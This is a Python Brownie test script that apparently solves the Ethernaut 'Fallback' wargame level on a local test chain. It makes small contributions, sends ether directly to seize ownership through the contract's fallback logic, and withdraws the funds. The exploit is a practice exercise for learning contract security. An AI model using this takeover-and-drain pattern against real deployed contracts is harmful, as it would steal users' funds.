from random import randint, randrange
from brownie import accounts, Fallback
from conftest import *
import brownie
from web3 import Web3
def isolation(fn_isolation):
    pass

def test_contribute(fallback):
    bob = accounts[1]
    
    print(fallback.getContribution({"from":bob}))
    with brownie.reverts():
        fallback.contribute({"from":bob, "value":"0.5 ether"})
    
    
    for account in accounts:
        # amount = f"{randrange(0.0004, 0.0009, 0.0001)} ether"
        amount = "0.0006 ether"
        fallback.contribute({"from":account, "value": f"0.000{randint(1,9)} ether"})
       
        # print(account, Web3.fromWei(amount, "ether"))
    print(fallback.getContribution())
    print(fallback.balance() )
    #being the new owner
    bob.transfer(fallback, "2 ether")
    assert fallback.owner() == bob
    
    #with draw the funds as a new owner
    balance_before = bob.balance()
    fallback.withdraw({"from": bob})
    
    balance_after = bob.balance()
    print("balanece before withdraw", balance_before)
    print("balance after withdraw", balance_after)